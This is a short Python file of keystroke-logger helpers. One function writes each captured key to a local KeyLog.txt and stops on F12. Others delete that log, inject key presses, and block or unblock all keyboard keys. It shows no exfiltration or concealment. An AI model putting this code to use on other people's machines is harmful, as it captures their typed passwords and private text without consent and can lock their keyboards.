import keyboard
from pynput.keyboard import Listener,Key, Controller
import os
from shutil import rmtree

#dir = os.getcwd()+'\\KeyLog.txt'
dir = "KeyLog.txt"
hooked = False

def getKey(key):
    
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        return False
    if key == "Key.space":
        key =" "
    if key == "Key.enter":
        key="\n"
    if key == "Key.tab":
        key="    "
    
    with open(dir,"a") as file:
        file.write(key)
    
def delete_log_file():
    #rmtree(dir)
    os.remove(dir)

def Key_press(key):
    Keyboard = Controller()
    Keyboard.press(key)
    # Keyboard.release(key)


def Lock_keyboard():
    for i in range(150):
        keyboard.block_key(i)


def Unlock_keyboard():
    for i in range(150):
        keyboard.unblock_key(i)
